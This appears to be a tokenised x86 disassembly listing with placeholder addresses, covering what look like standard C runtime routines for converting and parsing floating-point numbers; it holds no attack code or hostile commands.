add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_4235c9
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_423b0d
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_4162ac
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_4153b1
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_4241d5 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_425385
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax ecx
mov ebx eax
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
movzx ecx [ ebx + 0xa ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x32 ]
mov esi ecx
mov edx 0x7fff
xor esi eax
and eax edx
and ecx edx
and esi 0x8000
mov edi 0x7fff
lea edx [ ecx + eax ]
mov [ ebp - 0x70 ] esi
movzx edx dx
cmp ax di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp cx di
jae r-xdata
mov edi 0xbffd
cmp dx di
ja r-xdata
mov esi 0x3fbf
cmp dx si
ja r-xdata
xor esi esi
cmp ax si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp cx si
